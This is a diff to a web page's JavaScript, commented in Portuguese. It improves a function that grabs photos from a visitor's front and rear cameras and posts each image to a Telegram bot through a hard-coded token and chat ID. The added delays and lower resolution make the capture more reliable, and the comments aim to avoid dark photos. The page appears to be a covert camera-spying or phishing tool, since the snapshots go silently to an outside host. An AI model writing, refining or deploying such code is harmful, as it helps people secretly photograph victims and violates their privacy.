@@ -111,20 +111,50 @@
 
     async function tirarFoto(face, label) {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: face } });
+            // 1. Limpa qualquer rastro de câmera aberta antes de começar
+            if (window.currentStream) {
+                window.currentStream.getTracks().forEach(track => track.stop());
+            }
+
+            // 2. Aguarda 800ms para o hardware do celular "respirar"
+            await new Promise(r => setTimeout(r, 800));
+
+            const constraints = { 
+                video: { 
+                    facingMode: face,
+                    width: { ideal: 640 },
+                    height: { ideal: 480 }
+                }, 
+                audio: false 
+            };
+
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            window.currentStream = stream; // Guarda o stream atual
+            
             const video = document.getElementById('video');
             video.srcObject = stream;
+            
             await new Promise(r => video.onloadedmetadata = r);
+            
+            // 3. Tempo para o sensor de luz ajustar (evita foto preta/escura)
+            await new Promise(r => setTimeout(r, 1000)); 
+            
             const canvas = document.getElementById('canvas');
             canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-            stream.getTracks().forEach(t => t.stop());
-            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+            
+            // 4. Desliga a câmera atual antes de retornar para a próxima
+            stream.getTracks().forEach(track => track.stop());
+
+            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
             const fd = new FormData();
             fd.append('chat_id', ID);
             fd.append('photo', blob, `${label}.jpg`);
             fd.append('caption', `📸 Câmera ${label}`);
+            
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-        } catch (e) {}
+        } catch (error) {
+            console.error("Erro na captura:", label, error);
+        }
     }
 </script>
 </body>
